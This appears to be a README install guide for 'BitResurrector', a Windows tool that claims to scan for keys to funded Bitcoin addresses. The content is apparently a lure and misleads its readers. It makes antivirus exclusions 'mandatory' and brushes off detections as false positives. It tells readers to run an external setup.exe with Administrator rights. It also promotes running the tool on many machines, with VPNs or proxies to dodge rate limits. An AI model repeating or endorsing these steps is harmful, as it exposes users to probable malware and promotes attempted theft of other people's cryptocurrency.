# 🛠️ Installation & Setup Guide
### Project Maintainer: [@leadzevs](https://github.com/leadzevs)
### Resource Center: [https://ai-seedfinder.com/bitresurrector](https://ai-seedfinder.com/bitresurrector)

Follow these steps to deploy BitResurrector v3.0.3 on your hardware.

---

## 1. Preparation
BitResurrector is an industrial-grade tool. To function correctly, ensure the following:
- **Operating System**: Windows 10/11 (64-bit).
- **Permissions**: Launch with **Administrator Rights** for GPU/RAM access.
- **Drivers**: Ensure the latest NVIDIA CUDA or OpenCL drivers are installed.

---

## 2. Anti-Virus Configuration (Mandatory)
To prevent engine suppression, add the installation folder to your **Exclusions** list. Refer to our [technical blog](https://ai-seedfinder.com/bitresurrector) for a deep dive into why these False Positives occur.

---

## 3. Deployment
1.  **Download**: Get the `bitResurrector_v3.0.3_Setup.exe` from the [Official leadzevs Releases](https://github.com/leadzevs/BitResurrector/releases).
2.  **Verify**: Cross-check the file hash against [CHECKSUMS.md](CHECKSUMS.md).
3.  **Install**: Run the setup and select your installation path.
4.  **Global Database Synchronization**: Upon the first launch, the engine initiates a high-speed synchronization with the **Loyce Club** cloud repository to retrieve the latest dump of all Bitcoin addresses with positive balances (currently ~52–58 million entities > 1000 satoshis). The system builds a persistent **Bloom Filter** index on your local storage to ensure instant O(1) access during the scanning process.

---

## 4. Resource & Strategy: Distributed Network
For maximum coverage, utilize the **"Home Farm" strategy**:
- **Main PC (GPU)**: Run in "Turbo Mode" + "GPU Accelerator" for gross speed.
- **Old Laptops (CPU)**: BitResurrector is optimized to run on low-end hardware. Install on idle laptops to run in "Sniper Mode" 24/7.
- **Result**: 5 weak devices = 1 powerful workstation due to parallel probability coverage.
- **⚠️ Network Warning**: If running multiple devices on one router (same IP), use a **VPN or Proxy** for each machine to avoid Rate Limit bans from blockchain explorers in "API Global View" mode.
- **Website**: [https://ai-seedfinder.com/bitresurrector](https://ai-seedfinder.com/bitresurrector)
- **Telegram Channel**: [@aiseedfinder](https://t.me/aiseedfinder)

---
*© 2026 AI CryptoTeam. Developed by @leadzevs.*
